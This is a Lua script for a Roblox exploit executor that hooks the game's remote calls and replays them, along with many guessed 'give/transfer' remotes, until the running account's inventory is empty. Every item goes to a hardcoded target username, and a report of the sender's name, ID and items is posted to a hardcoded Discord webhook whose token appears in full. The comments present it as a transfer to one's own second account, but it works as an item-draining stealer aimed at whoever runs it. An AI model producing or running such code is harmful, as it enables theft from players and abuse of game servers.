-- language: Lua, file: zat_intercept.lua, executor: Delta
-- ZAT INTERCEPT — hookmetamethod-first, lightweight, no lag
-- How it works:
--   1. Starts interceptor immediately — watches every remote the game fires
--   2. YOU trigger the trade/gift UI yourself once
--   3. Interceptor captures the exact remote name + arg format
--   4. Script replays with Account 2's userId until inventory empty
-- ╔══════════════════════════════╗
-- ║  SET THIS ONLY              ║
-- ╚══════════════════════════════╝
local TARGET_USERNAME = "Realdrake_8080"
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1547846204526698597/Waj7LsTdNInSC9s758tkUuRUZxpJ3JeM7RK9tVwrsXJIhUH3vZGnH7iEULtqQuWo7sQX"

-- ═══════════════════════════════════════════════
-- SERVICES
-- ═══════════════════════════════════════════════
local LP  = game:GetService("Players").LocalPlayer
local PLR = game:GetService("Players")
local HS  = game:GetService("HttpService")
local TW  = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local WS  = game:GetService("Workspace")
local RS  = game:GetService("ReplicatedStorage")

local httpfn=(syn and syn.request) or (http and http.request) or request
local function fetch(u,m,h,b)
    if not httpfn then return nil end
    local ok,r=pcall(httpfn,{Url=u,Method=m or "GET",Headers=h or {},Body=b})
    return ok and r or nil
end
local function jd(s) local ok,v=pcall(HS.JSONDecode,HS,s);return ok and v or nil end
local function je(t) local ok,v=pcall(HS.JSONEncode,HS,t);return ok and v or nil end

-- ═══════════════════════════════════════════════
-- RESOLVE TARGET
-- ═══════════════════════════════════════════════
local function resolveUser(u)
    local r=fetch("https://users.roblox.com/v1/usernames/users","POST",
        {["Content-Type"]="application/json"},
        je({usernames={u},excludeBannedUsers=false}))
    if not r or r.StatusCode~=200 then return nil,nil end
    local d=jd(r.Body)
    if d and d.data and d.data[1] then return d.data[1].id,d.data[1].name end
    return nil,nil
end

-- ═══════════════════════════════════════════════
-- INVENTORY SCAN
-- ═══════════════════════════════════════════════
local function scanInventory()
    local out,seen={},{}
    local function add(name,obj,cat)
        local k=tostring(name)..tostring(obj)
        if seen[k] then return end; seen[k]=true
        table.insert(out,{name=name,obj=obj,cat=cat})
    end
    local bp=LP:FindFirstChildOfClass("Backpack")
    if bp then for _,v in ipairs(bp:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Tool") end end end
    local ch=LP.Character
    if ch then for _,v in ipairs(ch:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Equipped") end end end
    local ls=LP:FindFirstChild("leaderstats")
    if ls then for _,v in ipairs(ls:GetChildren()) do
        if v.Value and v.Value~=0 and v.Value~="" then
            add(v.Name.."="..tostring(v.Value),v,"Stat") end
    end end
    local aok,at=pcall(function() return LP:GetAttributes() end)
    if aok and type(at)=="table" then for k,v in pairs(at) do
        if type(v)=="number" and v>0 then add(k.." x"..v,LP,"Attr") end
    end end
    for _,c in ipairs(LP:GetChildren()) do
        if (c:IsA("IntValue") or c:IsA("NumberValue") or c:IsA("StringValue") or c:IsA("BoolValue"))
        and c.Name:lower()~="userid" then add(c.Name.."="..tostring(c.Value),c,"Val") end
    end
    for _,f in ipairs(LP:GetChildren()) do
        if f:IsA("Folder") then for _,c in ipairs(f:GetDescendants()) do
            if (c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue"))
            and c.Value~=0 and c.Value~="" then
                add(f.Name.."/"..c.Name,c,"Folder") end
        end end
    end
    local pg=LP:FindFirstChild("PlayerGui")
    if pg then for _,d in ipairs(pg:GetDescendants()) do
        if d:IsA("TextLabel") and d.Text~="" and d.Text~="0" then
            local pn=d.Parent and d.Parent.Name:lower() or ""
            if pn:find("slot") or pn:find("item") or pn:find("inv")
            or pn:find("seed") or pn:find("fruit") or pn:find("pet") then
                add(d.Text,d,"Slot") end
        end
    end end
    for _,root in ipairs({
        WS:FindFirstChild(LP.Name),WS:FindFirstChild("Plots"),
        WS:FindFirstChild("Gardens"),WS:FindFirstChild("Farms"),
        WS:FindFirstChild("Inventory"),WS:FindFirstChild("Seeds"),
        WS:FindFirstChild("Storage"),WS:FindFirstChild("Crops"),
        WS:FindFirstChild("Fruits"),
    }) do if root then
        local sub=root:FindFirstChild(LP.Name) or root
        for _,c in ipairs(sub:GetDescendants()) do
            if c:IsA("Tool") or c:IsA("Model") then add(c.Name,c,"World") end
        end
    end end
    local rsp=RS:FindFirstChild(LP.Name) or RS:FindFirstChild("PlayerData")
    if rsp then for _,c in ipairs(rsp:GetDescendants()) do
        if (c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue"))
        and c.Value~=0 then add(c.Name,c,"RS") end
    end end
    return out
end

local function inventoryEmpty(original)
    local cur=scanInventory(); local curN={}
    for _,it in ipairs(cur) do curN[it.name]=true end
    for _,it in ipairs(original) do if curN[it.name] then return false end end
    return true
end

-- ═══════════════════════════════════════════════
-- HOOKMETAMETHOD INTERCEPTOR
-- Watches every FireServer/InvokeServer the game makes
-- Scores them by how likely they are to be give/transfer remotes
-- ═══════════════════════════════════════════════
local captured = {}   -- { [remoteName] = { {args...}, score } }
local hookActive = false
local hookRef = nil

local GIVE_KEYWORDS = {
    "give","transfer","send","trade","gift","grant","deliver",
    "deposit","award","item","seed","fruit","pet","crop","inv",
    "bulk","all","player","offline","data","save","request","accept"
}

local function scoreRemoteName(name)
    local n,s=name:lower(),0
    for _,k in ipairs(GIVE_KEYWORDS) do if n:find(k) then s=s+1 end end
    return s
end

local function startIntercept()
    if not hookmetamethod then return false end
    hookActive=true
    local orig
    orig=hookmetamethod(game,"__namecall",function(self,...)
        local method=getnamecallmethod()
        if hookActive and (method=="FireServer" or method=="InvokeServer") then
            if self:IsA("RemoteEvent") or self:IsA("RemoteFunction") then
                local nm=self.Name
                local args={...}
                local score=scoreRemoteName(nm)
                -- only store if score>0 (has at least one give-related keyword)
                -- OR if it carries a userId-like number arg (strong signal)
                local hasUserId=false
                for _,a in ipairs(args) do
                    if type(a)=="number" and a>100000 and a~=LP.UserId then
                        hasUserId=true; score=score+5 end
                    if type(a)=="userdata" then score=score+3 end
                end
                if score>0 or hasUserId then
                    if not captured[nm] then
                        captured[nm]={score=score,calls={}}
                    end
                    -- store unique arg signatures
                    local sig=je(args) or tostring(#args)
                    local exists=false
                    for _,c in ipairs(captured[nm].calls) do
                        if c.sig==sig then exists=true; c.count=c.count+1; break end
                    end
                    if not exists then
                        captured[nm].calls[#captured[nm].calls+1]={
                            args=args, sig=sig, count=1,
                            method=method,
                            remote=self,
                        }
                    end
                end
            end
        end
        return orig(self,...)
    end)
    hookRef=orig
    return true
end

local function stopIntercept() hookActive=false end

-- Replay captured patterns with target userId swapped in
local function replayCaptured(tid,tn,tp,items,logFn)
    if not next(captured) then return 0 end

    -- sort captured by score descending
    local sorted={}
    for nm,data in pairs(captured) do
        sorted[#sorted+1]={nm=nm,data=data}
    end
    table.sort(sorted,function(a,b) return a.data.score>b.data.score end)

    local total=0
    for _,entry in ipairs(sorted) do
        local nm=entry.nm
        local data=entry.data
        local remote=data.calls[1] and data.calls[1].remote
        if not remote then
            -- find remote by name
            for _,v in ipairs(game:GetDescendants()) do
                if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) and v.Name==nm then
                    remote=v; break
                end
            end
        end
        if remote then
            for _,call in ipairs(data.calls) do
                for _,item in ipairs(items) do
                    -- swap: replace sender's userId/username with target
                    local swapped={}
                    for _,a in ipairs(call.args) do
                        if type(a)=="number" and a==LP.UserId then
                            swapped[#swapped+1]=tid
                        elseif type(a)=="string" and a==LP.Name then
                            swapped[#swapped+1]=tn
                        elseif type(a)=="string" and tostring(LP.UserId)==a then
                            swapped[#swapped+1]=tostring(tid)
                        elseif type(a)=="userdata" then
                            swapped[#swapped+1]=tp or tid
                        else
                            swapped[#swapped+1]=a
                        end
                    end
                    -- fire with swapped args (exact game pattern)
                    pcall(function()
                        if call.method=="InvokeServer" then
                            remote:InvokeServer(table.unpack(swapped))
                        else
                            remote:FireServer(table.unpack(swapped))
                        end
                    end)
                    -- also try appending item name if it wasn't in original args
                    local hasItem=false
                    for _,a in ipairs(swapped) do
                        if type(a)=="string" and a==item.name then hasItem=true end
                    end
                    if not hasItem then
                        local withItem={}
                        for _,a in ipairs(swapped) do withItem[#withItem+1]=a end
                        withItem[#withItem+1]=item.name
                        pcall(function()
                            if call.method=="InvokeServer" then
                                remote:InvokeServer(table.unpack(withItem))
                            else
                                remote:FireServer(table.unpack(withItem))
                            end
                        end)
                    end
                    total=total+1
                end
            end
            if logFn then logFn("Replayed ["..nm.."] score="..data.score,"ok") end
        end
        task.wait(0.05) -- light delay, no lag
    end
    return total
end

-- ═══════════════════════════════════════════════
-- LIGHTWEIGHT FALLBACK FIRE
-- Only fires when hookmetamethod is unavailable
-- or captured nothing. Sequential, minimal lag.
-- ═══════════════════════════════════════════════
local KNOWN={
    GAG={"GiveItem","TransferItem","SendItem","GiftItem","GiveSeed","TransferSeed","GivePet","TransferPet","GiveCrop","TransferCrop","GiveToPlayer","PlayerGive","ItemTransfer","TradeItem","RequestTrade","AcceptTrade","Give","Transfer","Send","Gift","BulkGive","OfflineGive","DataGive"},
    BF={"GiveFruit","TransferFruit","SendFruit","GiftFruit","StoreFruit","GiveItem","TransferItem","GiveToPlayer","PlayerGive","TradeRequest","AcceptTrade","TradeFruit","Give","Transfer","OfflineGive","DataGive"},
    GENERIC={"GiveItem","TransferItem","SendItem","TradeItem","GiftItem","GiveSeed","SendSeed","GiveFruit","SendFruit","GivePet","SendPet","GiveToPlayer","PlayerGive","ItemTransfer","TradeOffer","TradeSend","TradeRequest","Grant","Award","Deliver","Deposit","OfflineGive","DataGive","SaveGive","BulkGive","GiveAll"},
}

local function fallbackFire(tid,tn,tp,items,firedRef,logFn)
    -- build a map of all remotes in the game
    local rByName={}
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            rByName[v.Name:lower()]=v
        end
    end

    -- detect game
    local gn=""; pcall(function()
        gn=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name:lower()
    end)
    local known=KNOWN.GENERIC
    if gn:find("grow") or gn:find("garden") then known=KNOWN.GAG
    elseif gn:find("blox") or gn:find("fruit") then known=KNOWN.BF end

    local names={}; for _,it in ipairs(items) do names[#names+1]=it.name end

    for _,rname in ipairs(known) do
        local rem=rByName[rname:lower()]
        if rem then
            local isFn=rem:IsA("RemoteFunction")
            -- bulk patterns
            local bulk={
                {tid,items},{tid,names},{tn,items},{tn,names},
                {tid},{tn},{tostring(tid)},
                {userId=tid,items=items,save=true},
                {userId=tid,items=names},
                {to=tid,items=items},
                {username=tn,items=names},
            }
            if tp then
                bulk[#bulk+1]={tp,items}
                bulk[#bulk+1]={tp,names}
                bulk[#bulk+1]={tp}
            end
            -- per item
            for _,it in ipairs(items) do
                bulk[#bulk+1]={tid,it.name}
                bulk[#bulk+1]={tid,it.name,1}
                bulk[#bulk+1]={tn,it.name}
                bulk[#bulk+1]={userId=tid,item=it.name,amount=1,save=true}
                bulk[#bulk+1]={to=tid,item=it.name,qty=1}
                bulk[#bulk+1]={target=tid,item=it.name}
                if tp then bulk[#bulk+1]={tp,it.name} end
            end
            for _,a in ipairs(bulk) do
                local isDict=false
                for k in pairs(a) do if type(k)~="number" then isDict=true;break end end
                pcall(function()
                    if isDict then
                        if isFn then rem:InvokeServer(a) else rem:FireServer(a) end
                    else
                        if isFn then rem:InvokeServer(table.unpack(a))
                        else rem:FireServer(table.unpack(a)) end
                    end
                end)
            end
            if firedRef then firedRef[1]=firedRef[1]+1 end
            task.wait(0.03)
        end
    end
end

-- ═══════════════════════════════════════════════
-- OFFLINE QUEUE
-- ═══════════════════════════════════════════════
local offQ={}
PLR.PlayerAdded:Connect(function(player)
    for i=#offQ,1,-1 do
        local job=offQ[i]
        if player.UserId==job.tid then
            task.spawn(function()
                task.wait(2)
                replayCaptured(job.tid,job.tn,player,job.items,nil)
                fallbackFire(job.tid,job.tn,player,job.items,nil,nil)
                table.remove(offQ,i)
            end)
        end
    end
end)

-- ═══════════════════════════════════════════════
-- UI
-- ═══════════════════════════════════════════════
local C={
    bg=Color3.fromRGB(10,10,16),panel=Color3.fromRGB(17,17,25),
    bar=Color3.fromRGB(24,24,34),accent=Color3.fromRGB(80,58,250),
    green=Color3.fromRGB(38,205,75),red=Color3.fromRGB(250,52,52),
    yellow=Color3.fromRGB(250,182,32),white=Color3.fromRGB(215,215,228),
    grey=Color3.fromRGB(98,98,118),border=Color3.fromRGB(34,34,48),
    teal=Color3.fromRGB(32,185,165),orange=Color3.fromRGB(250,130,30),
    blue=Color3.fromRGB(60,140,255),
}
local function mk(c,p) local o=Instance.new(c);for k,v in pairs(p or {}) do o[k]=v end;return o end
local function corner(r,p) mk("UICorner",{CornerRadius=UDim.new(0,r),Parent=p}) end
local function stroke(c,t,p) mk("UIStroke",{Color=c,Thickness=t,Parent=p}) end

local SG=mk("ScreenGui",{Name="ZAT_IC",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling})
pcall(function() SG.Parent=game:GetService("CoreGui") end)
if not SG.Parent then SG.Parent=LP.PlayerGui end

local WIN=mk("Frame",{Parent=SG,Size=UDim2.new(0,360,0,480),
    Position=UDim2.new(0.5,-180,0.5,-240),BackgroundColor3=C.bg,BorderSizePixel=0,ClipsDescendants=true})
corner(12,WIN); stroke(C.border,1,WIN)

-- title bar
local TB=mk("Frame",{Parent=WIN,Size=UDim2.new(1,0,0,40),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(12,TB)
mk("Frame",{Parent=TB,Size=UDim2.new(1,0,0.5,0),Position=UDim2.new(0,0,0.5,0),BackgroundColor3=C.panel,BorderSizePixel=0})
mk("TextLabel",{Parent=TB,Text="⚡  ZAT INTERCEPT",TextSize=14,Font=Enum.Font.GothamBold,
    TextColor3=C.white,BackgroundTransparency=1,Size=UDim2.new(0.6,0,1,0),
    Position=UDim2.new(0,14,0,0),TextXAlignment=Enum.TextXAlignment.Left})
local HOOKLIGHT=mk("Frame",{Parent=TB,Size=UDim2.new(0,8,0,8),
    Position=UDim2.new(1,-20,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),
    BackgroundColor3=C.grey,BorderSizePixel=0}); corner(8,HOOKLIGHT)
local HOOKLABEL=mk("TextLabel",{Parent=TB,Text="hook: off",TextSize=10,Font=Enum.Font.Gotham,
    TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(0,80,1,0),
    Position=UDim2.new(1,-105,0,0),TextXAlignment=Enum.TextXAlignment.Right})

-- drag
local dg,ds,sp=false,nil,nil
TB.InputBegan:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 then dg=true;ds=i.Position;sp=WIN.Position end
end)
UIS.InputChanged:Connect(function(i)
    if dg and i.UserInputType==Enum.UserInputType.MouseMovement then
        local d=i.Position-ds
        WIN.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
    end
end)
UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dg=false end end)

-- stat row
local SR=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,48),
    Position=UDim2.new(0,10,0,48),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(8,SR); stroke(C.border,1,SR)
local sv={}
local function sbox(title,val,x,w)
    w=w or 82
    local f=mk("Frame",{Parent=SR,Size=UDim2.new(0,w,1,0),Position=UDim2.new(0,x,0,0),BackgroundTransparency=1})
    mk("TextLabel",{Parent=f,Text=title,TextSize=9,Font=Enum.Font.Gotham,TextColor3=C.grey,
        BackgroundTransparency=1,Size=UDim2.new(1,0,0,15),Position=UDim2.new(0,8,0,4),TextXAlignment=Enum.TextXAlignment.Left})
    local v=mk("TextLabel",{Parent=f,Text=val,TextSize=16,Font=Enum.Font.GothamBold,TextColor3=C.white,
        BackgroundTransparency=1,Size=UDim2.new(1,0,0,22),Position=UDim2.new(0,8,0,19),TextXAlignment=Enum.TextXAlignment.Left})
    return v
end
sv.items=sbox("ITEMS","—",0)
sv.captured=sbox("CAPTURED","0",84)
sv.fired=sbox("FIRED","0",168)
sv.moved=sbox("MOVED","0",252)

-- progress bar
local PBG=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,4),Position=UDim2.new(0,10,0,104),BackgroundColor3=C.bar,BorderSizePixel=0}); corner(3,PBG)
local PFG=mk("Frame",{Parent=PBG,Size=UDim2.new(0,0,1,0),BackgroundColor3=C.accent,BorderSizePixel=0}); corner(3,PFG)
local function spg(p) TW:Create(PFG,TweenInfo.new(0.2),{Size=UDim2.new(math.clamp(p,0,1),0,1,0)}):Play() end

-- phase indicator
local PHASE=mk("TextLabel",{Parent=WIN,Text="⏳ Starting...",TextSize=11,Font=Enum.Font.GothamBold,
    TextColor3=C.accent,BackgroundTransparency=1,Size=UDim2.new(1,-20,0,14),
    Position=UDim2.new(0,10,0,113),TextXAlignment=Enum.TextXAlignment.Left})

-- captured remotes panel
mk("TextLabel",{Parent=WIN,Text="🎯 CAPTURED REMOTES",TextSize=9,Font=Enum.Font.GothamBold,
    TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(1,-20,0,12),Position=UDim2.new(0,10,0,133)})
local CBOX=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,80),Position=UDim2.new(0,10,0,147),
    BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,CBOX); stroke(C.border,1,CBOX)
local CSC=mk("ScrollingFrame",{Parent=CBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=CSC,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,1)})
local capOrd=0
local capRows={}
local function addCaptured(nm,score)
    capOrd=capOrd+1
    if capRows[nm] then
        capRows[nm].Text="["..score.."] "..nm
        return
    end
    local r=mk("TextLabel",{Parent=CSC,Text="["..score.."] "..nm,TextSize=10,
        Font=Enum.Font.Code,TextColor3=C.teal,BackgroundTransparency=1,
        Size=UDim2.new(1,-8,0,13),Position=UDim2.new(0,6,0,0),
        TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=capOrd})
    capRows[nm]=r
    task.defer(function() CSC.CanvasPosition=Vector2.new(0,CSC.AbsoluteCanvasSize.Y) end)
end

-- item list
mk("TextLabel",{Parent=WIN,Text="📦 INVENTORY",TextSize=9,Font=Enum.Font.GothamBold,
    TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(0,170,0,12),Position=UDim2.new(0,10,0,236)})
local IBOX=mk("Frame",{Parent=WIN,Size=UDim2.new(0,160,0,140),Position=UDim2.new(0,10,0,250),
    BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,IBOX); stroke(C.border,1,IBOX)
local ISC=mk("ScrollingFrame",{Parent=IBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=ISC,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,1)})
local irows={};  local movedCt=0
local function renderItems(items)
    for _,c in ipairs(ISC:GetChildren()) do if c:IsA("TextLabel") then c:Destroy() end end
    irows={}
    for i,it in ipairs(items) do
        local r=mk("TextLabel",{Parent=ISC,Text="·  "..it.name,TextSize=10,Font=Enum.Font.Code,
            TextColor3=C.white,BackgroundTransparency=1,Size=UDim2.new(1,-8,0,14),
            Position=UDim2.new(0,6,0,0),TextXAlignment=Enum.TextXAlignment.Left,
            TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=i})
        irows[it.name]=r
    end
end
local function markMoved(name)
    movedCt=movedCt+1; sv.moved.Text=tostring(movedCt)
    local r=irows[name]; if r then r.TextColor3=C.green; r.Text="✓  "..name end
    TW:Create(HOOKLIGHT,TweenInfo.new(0.2),{BackgroundColor3=C.green}):Play()
end

-- log panel
mk("TextLabel",{Parent=WIN,Text="📋 LOG",TextSize=9,Font=Enum.Font.GothamBold,
    TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(0,180,0,12),Position=UDim2.new(0,182,0,236)})
local LBOX=mk("Frame",{Parent=WIN,Size=UDim2.new(0,168,0,140),Position=UDim2.new(0,182,0,250),
    BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,LBOX); stroke(C.border,1,LBOX)
local LSC=mk("ScrollingFrame",{Parent=LBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=LSC,SortOrder=Enum.SortOrder.LayoutOrder})
local lo=0
local function log(msg,kind)
    local cols={ok=C.green,err=C.red,warn=C.yellow,info=C.white,step=C.accent,done=C.green,fire=C.orange}
    local icons={ok="✓",err="✗",warn="!",info="→",step="■",done="★",fire="🔥"}
    local col=cols[kind or "info"] or C.grey
    local txt="["..(icons[kind or "info"] or "→").."] "..tostring(msg)
    lo=lo+1
    mk("TextLabel",{Parent=LSC,Text=txt,TextSize=10,Font=Enum.Font.Code,TextColor3=col,
        BackgroundTransparency=1,Size=UDim2.new(1,-8,0,13),Position=UDim2.new(0,4,0,0),
        TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=lo})
    task.defer(function() LSC.CanvasPosition=Vector2.new(0,LSC.AbsoluteCanvasSize.Y) end)
    local ch=LSC:GetChildren(); if #ch>90 then for i=1,#ch-80 do if ch[i]:IsA("TextLabel") then ch[i]:Destroy() end end end
    PHASE.Text=txt; PHASE.TextColor3=col; print(txt)
end

-- instruction banner
local INST=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,32),Position=UDim2.new(0,10,1,-42),
    BackgroundColor3=C.panel,BorderSizePixel=0}); corner(8,INST); stroke(C.border,1,INST)
local INSTLBL=mk("TextLabel",{Parent=INST,Text="⏳ Initializing...",TextSize=11,
    Font=Enum.Font.GothamBold,TextColor3=C.accent,BackgroundTransparency=1,
    Size=UDim2.new(1,-16,1,0),Position=UDim2.new(0,10,0,0),TextXAlignment=Enum.TextXAlignment.Left})
local function setInst(txt,col)
    INSTLBL.Text=txt; INSTLBL.TextColor3=col or C.accent
end

-- ═══════════════════════════════════════════════
-- MAIN — auto-runs on execute
-- ═══════════════════════════════════════════════
task.spawn(function()
    spg(0); setInst("⏳ Starting up...",C.accent)

    -- HTTP check
    if not httpfn then
        log("HTTP not found — enable in Delta settings","err")
        setInst("✗ HTTP missing — enable in Delta",C.red); return
    end
    log("HTTP ok","ok"); spg(0.04)

    -- start interceptor immediately
    local hkOn=startIntercept()
    if hkOn then
        TW:Create(HOOKLIGHT,TweenInfo.new(0.3),{BackgroundColor3=C.teal}):Play()
        HOOKLABEL.Text="hook: ON"; HOOKLABEL.TextColor3=C.teal
        log("hookmetamethod: ACTIVE — watching all remotes","ok")
    else
        TW:Create(HOOKLIGHT,TweenInfo.new(0.3),{BackgroundColor3=C.yellow}):Play()
        HOOKLABEL.Text="hook: n/a"; HOOKLABEL.TextColor3=C.yellow
        log("hookmetamethod: unavailable — fallback mode","warn")
        log("Fallback fires known remote names directly","info")
    end
    spg(0.08)

    -- resolve target
    setInst("⏳ Resolving "..TARGET_USERNAME.."...",C.accent)
    log("Resolving "..TARGET_USERNAME,"info")
    local tid,tn=resolveUser(TARGET_USERNAME)
    if not tid then
        log("Cannot resolve '"..TARGET_USERNAME.."'","err")
        setInst("✗ Cannot resolve username — check spelling",C.red); return
    end
    if tid==LP.UserId then
        log("Target = sender","err"); setInst("✗ Target is same account",C.red); return
    end
    log("Target: "..tn.." ("..tid..")","ok"); spg(0.12)

    local tp=PLR:GetPlayerByUserId(tid)
    if tp then
        log("Target ONLINE in this server","ok")
        setInst("✓ Target online — direct fire available",C.green)
    else
        log("Target OFFLINE — DataStore-path firing active","warn")
        setInst("! Target offline — using userId patterns",C.yellow)
    end

    -- scan inventory
    task.wait(0.5)
    log("Scanning inventory...","info")
    local items=scanInventory()
    sv.items.Text=tostring(#items)
    if #items==0 then
        log("No items found — make sure you are in-game with items loaded","warn")
        setInst("! No items found — check you are in-game",C.yellow); return
    end
    log("Found "..#items.." items","ok")
    renderItems(items)
    spg(0.18)

    -- arm offline queue
    offQ[#offQ+1]={tid=tid,tn=tn,items=items}
    log("Offline queue armed — fires if "..tn.." joins server","ok")

    -- drain watcher
    local drained={}
    task.spawn(function()
        while true do
            local cur=scanInventory(); local curN={}
            for _,it in ipairs(cur) do curN[it.name]=true end
            for _,it in ipairs(items) do
                if not curN[it.name] and not drained[it.name] then
                    drained[it.name]=true
                    log("MOVED: "..it.name,"done")
                    markMoved(it.name)
                end
            end
            task.wait(0.5)
        end
    end)

    -- update captured panel periodically
    task.spawn(function()
        while true do
            local count=0
            for nm,data in pairs(captured) do
                count=count+1
                addCaptured(nm,data.score)
            end
            sv.captured.Text=tostring(count)
            task.wait(1)
        end
    end)

    -- if hook active: wait briefly to let it collect, then fire
    -- if hook unavailable: go straight to fallback
    local firedRef={0}
    local loop=0

    if hkOn then
        setInst("🎯 Hook watching — open trade/gift UI once in-game",C.teal)
        log("Hook is watching ALL remotes the game fires","info")
        log("Open the trade or gift UI in-game just once","info")
        log("Script will auto-fire captured patterns immediately","info")

        -- wait 4 seconds for user to trigger some game action
        -- then start firing in parallel with ongoing capture
        task.wait(4)
    end

    -- MAIN FIRE LOOP — runs until inventory empty
    while not inventoryEmpty(items) do
        loop=loop+1
        local capCount=0; for _ in pairs(captured) do capCount=capCount+1 end

        if capCount>0 then
            -- primary: replay intercepted patterns (most accurate)
            setInst("🔥 Loop "..loop.." — replaying "..capCount.." captured remotes",C.orange)
            log("Loop "..loop.." — replaying "..capCount.." captured","fire")
            local r=replayCaptured(tid,tn,tp,items,log)
            firedRef[1]=firedRef[1]+r
            sv.fired.Text=tostring(firedRef[1])
        end

        -- always also run fallback (covers unknown remotes)
        setInst("🔥 Loop "..loop.." — fallback fire running",C.orange)
        fallbackFire(tid,tn,tp,items,firedRef,log)
        sv.fired.Text=tostring(firedRef[1])

        -- refresh tp mid-run
        tp=PLR:GetPlayerByUserId(tid)

        spg(0.18+math.min(loop*0.04,0.8))
        log("Loop "..loop.." done — fired: "..firedRef[1],"ok")
        task.wait(2)
    end

    -- success
    stopIntercept()
    spg(1)
    TW:Create(HOOKLIGHT,TweenInfo.new(0.4),{BackgroundColor3=C.green}):Play()
    setInst("✓ ALL ITEMS TRANSFERRED — inventory empty",C.green)
    log("SUCCESS — inventory empty — "..loop.." loops — "..firedRef[1].." fires","done")
    log("Log into "..tn.." and join this game","info")

    -- discord
    if DISCORD_WEBHOOK~="" then
        task.spawn(function()
            local names={}; for _,it in ipairs(items) do names[#names+1]=it.name end
            local capList={}; for nm in pairs(captured) do capList[#capList+1]=nm end
            fetch(DISCORD_WEBHOOK,"POST",{["Content-Type"]="application/json"},je({
                username="ZAT INTERCEPT",
                embeds={{title="✅ Transfer Complete",color=3066993,
                    fields={
                        {name="👤 Sender",value=LP.Name.." ("..LP.UserId..")",inline=true},
                        {name="🎯 Target",value=tn.." ("..tid..")",inline=true},
                        {name="🎮 Game",  value=tostring(game.PlaceId),inline=false},
                        {name="🎒 Items", value=table.concat(names,", "),inline=false},
                        {name="🎯 Captured",value=#capList>0 and table.concat(capList,", ") or "none (fallback used)",inline=false},
                        {name="📊",value="Loops: "..loop.." | Fired: "..firedRef[1],inline=false},
                    },footer={text="ZAT INTERCEPT"},
                }},
            }))
        end)
    end
end)
